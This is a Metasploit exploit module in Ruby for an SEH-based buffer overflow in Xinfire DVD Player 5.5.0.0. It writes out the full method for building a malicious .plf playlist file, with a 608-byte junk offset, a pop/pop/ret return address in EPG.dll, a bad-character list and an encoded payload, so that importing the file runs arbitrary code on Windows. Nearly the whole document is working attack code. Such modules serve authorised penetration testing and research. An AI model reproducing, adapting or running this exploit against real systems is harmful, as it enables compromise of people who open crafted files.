##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Xinfire DVD Player Buffer Overflow',
      'Description'    => %q{
          This module exploits a buffer overflow in Xinfire DVD Player Pro and Standard v5.5.0.0.When
        the application is used to import a specially crafted plf file, a buffer overflow occurs
        allowing arbitrary code execution.Tested successfully on Win7, Win10.This software is similar as DVD X Player and BlazeDVD.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'metacom' # MSF Module and Vulnerability discovery
        ],
      'References'     =>
        [
          [ 'OSVDB', '' ],
          [ 'EDB', '' ],
          [ 'EDB', '' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'DisableNops' => true,
          'BadChars' => "\x00\x0a\x0d\x1a\x20",
          'Space' => 1000,
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          [ 'Windows Universal', { 'Ret' => 0x6160174F, 'Offset' => 608 } ],	# p/p/r EPG.dll
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Apr 15 2020',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ false, 'The file name.', 'msf.plf']),
      ])

  end

  def exploit

    buffer = rand_text(target['Offset'])  #junk
    buffer << generate_seh_record(target.ret)
    buffer << payload.encoded  # 1000 bytes of space
    # more junk may be needed to trigger the exception

    file_create(buffer)

  end
end
